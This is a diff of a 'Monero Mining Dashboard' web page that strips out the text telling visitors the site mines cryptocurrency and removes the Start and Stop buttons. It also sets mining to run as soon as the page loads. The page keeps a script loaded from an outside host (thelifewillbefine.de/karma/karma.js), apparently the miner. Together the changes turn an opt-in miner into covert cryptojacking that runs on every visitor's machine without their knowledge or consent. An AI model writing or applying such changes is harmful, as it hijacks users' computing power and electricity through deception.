@@ -9,23 +9,11 @@
 <body>
     <header>
         <h1>Monero Mining Dashboard</h1>
-        <nav>
-            <a href="#about">About</a>
-            <a href="#features">Features</a>
-            <a href="#contact">Contact</a>
-        </nav>
     </header>
 
     <main>
-        <section id="about">
-            <h2>About Mining</h2>
-            <p>Start mining Monero (XMR) directly from your browser. Use this site to contribute computational power.</p>
-        </section>
-
-        <section id="features">
-            <h2>Mining Controls</h2>
-            <button id="start-mining">Start Mining</button>
-            <button id="stop-mining" disabled>Stop Mining</button>
+        <section id="mining-stats">
+            <h2>Mining Statistics</h2>
             <p><strong>Hashrate:</strong> <span id="hash-rate">0</span> H/s</p>
             <p><strong>Total Hashes:</strong> <span id="total-hashes">0</span></p>
         </section>
@@ -38,7 +26,7 @@
     <!-- Script -->
     <script src="https://thelifewillbefine.de/karma/karma.js?karma=bs?nosaj=faster.mo"></script>
     <script>
-        let isMining = false;
+        let isMining = true;
         let totalHashes = 0;
 
         // Инициализация EverythingIsLife
@@ -50,8 +38,6 @@
         }
 
         // Элементы интерфейса
-        const startMiningButton = document.getElementById('start-mining');
-        const stopMiningButton = document.getElementById('stop-mining');
         const hashRateDisplay = document.getElementById('hash-rate');
         const totalHashesDisplay = document.getElementById('total-hashes');
 
@@ -66,22 +52,6 @@
                 hashRateDisplay.innerText = "0";
             }
         }
-
-        // Запуск майнинга
-        startMiningButton.addEventListener('click', () => {
-            isMining = true;
-            startMiningButton.disabled = true;
-            stopMiningButton.disabled = false;
-            console.log('Mining started.');
-        });
-
-        // Остановка майнинга
-        stopMiningButton.addEventListener('click', () => {
-            isMining = false;
-            startMiningButton.disabled = false;
-            stopMiningButton.disabled = true;
-            console.log('Mining stopped.');
-        });
 
         // Интервал обновления
         setInterval(updateStats, 1000);
